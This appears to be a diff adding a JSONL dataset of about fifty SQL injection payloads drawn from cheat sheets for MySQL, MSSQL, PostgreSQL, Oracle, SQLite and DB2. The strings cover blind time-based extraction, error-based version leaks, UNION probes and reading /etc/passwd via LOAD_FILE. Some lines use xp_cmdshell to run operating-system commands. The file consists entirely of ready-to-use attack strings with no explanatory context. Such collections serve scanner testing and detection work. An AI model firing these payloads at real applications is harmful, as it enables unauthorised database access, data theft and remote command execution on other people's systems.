@@ -1,0 +1,50 @@
+{"payload_wire": "EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';", "record_id": "03ac57fef98666bb", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#", "record_id": "061c04f1b4aea136", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'", "record_id": "074aa377a635f5d0", "source_file": "SQL Injection/PostgreSQL Injection.md"}
+{"payload_wire": "UNION SELECT NULL, NULL, NULL;--", "record_id": "0c698e4018ba1dc4", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #", "record_id": "17aa955f4be3d1c0", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#", "record_id": "17dba5c55034ac3d", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--", "record_id": "1b361aeccd633eeb", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "record_id": "1d7695e951ecf4ec", "source_file": "SQL Injection/SQLite Injection.md"}
+{"payload_wire": "' OR 1 -- -", "record_id": "2363e1fd8a147378", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "+BENCHMARK(40000000,SHA1(1337))+", "record_id": "26cb5e5908bc413e", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "cast((SELECT @@version) as int)", "record_id": "2859614af82369f9", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "ProductID=1';waitfor delay '0:0:10'--", "record_id": "29d30c162a153574", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "EXEC xp_cmdshell \"net user\";", "record_id": "2bdbeae8940007b0", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2", "record_id": "2c60a054fea1094f", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --", "record_id": "32c07dd08d805405", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "\" OR \"\" = \"", "record_id": "3c2ba7a7ec956e4b", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-", "record_id": "3dc2d510333f4943", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2", "record_id": "436f0ad19b843af8", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#", "record_id": "477d99fc63f06d1a", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)", "record_id": "4c224089e16bed72", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "UNION ALL SELECT LOAD_FILE('/etc/passwd') --", "record_id": "51cacf94e88ee326", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#", "record_id": "59ae1b29d3340b66", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "SELECT LOAD_FILE('\\\\\\\\error\\\\abc');", "record_id": "619f196427400624", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "ProductID=1;waitfor delay '0:0:10'--", "record_id": "62047921e93a56a5", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))", "record_id": "63893c5f5be0176b", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "%8C%A8%27 OR 1=1--", "record_id": "6739d94331863fc5", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')", "record_id": "6bbdff23d6c3dd7e", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR", "record_id": "6e8aa6cc22ea397a", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "' OR '1", "record_id": "7477250727b4aa40", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68", "record_id": "759c64c3fa141f29", "source_file": "SQL Injection/DB2 Injection.md"}
+{"payload_wire": "%A8%27 OR 1=1;--", "record_id": "7ee95f785fdd6e0f", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "select 1 from pg_sleep(5)", "record_id": "8da706cb05af44a7", "source_file": "SQL Injection/PostgreSQL Injection.md"}
+{"payload_wire": "select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1", "record_id": "979d9ca500d85cf8", "source_file": "SQL Injection/PostgreSQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#", "record_id": "9b252491d0022937", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "UNION SELECT NULL, NULL;--", "record_id": "9e636964a64a5dd1", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)", "record_id": "a1afc88f5c5fd5b9", "source_file": "SQL Injection/OracleSQL Injection.md"}
+{"payload_wire": "%bf' OR 1=1 -- --", "record_id": "a4b0d978acf7c171", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#", "record_id": "a78869058704293c", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "'+BENCHMARK(3200,SHA1(1))+'", "record_id": "b3a5452d32469bd0", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#", "record_id": "c8b544c67d296fe5", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "ProductID=1');waitfor delay '0:0:10'--", "record_id": "d2d558af7582af91", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "' + cast((SELECT @@version) as int) + '", "record_id": "dc95dd8b063ff71e", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1", "record_id": "dd20b0210ef0fe1c", "source_file": "SQL Injection/PostgreSQL Injection.md"}
+{"payload_wire": "UPDATEXML(null,CONCAT(0x0a,version()),null)-- -", "record_id": "e0af7fbbed1c242a", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';", "record_id": "e10e626ac8190c49", "source_file": "SQL Injection/MSSQL Injection.md"}
+{"payload_wire": "2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2", "record_id": "e8c74465d0b97d72", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": ";(select 1 from pg_sleep(5))", "record_id": "e9c735cfb8e47d1e", "source_file": "SQL Injection/PostgreSQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#", "record_id": "eb425dfe0a432ebf", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "UNION SELECT NULL;--", "record_id": "f00f9b3a2a97aec0", "source_file": "SQL Injection/MySQL Injection.md"}
+{"payload_wire": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#", "record_id": "f1dd47023d9fb532", "source_file": "SQL Injection/MySQL Injection.md"}
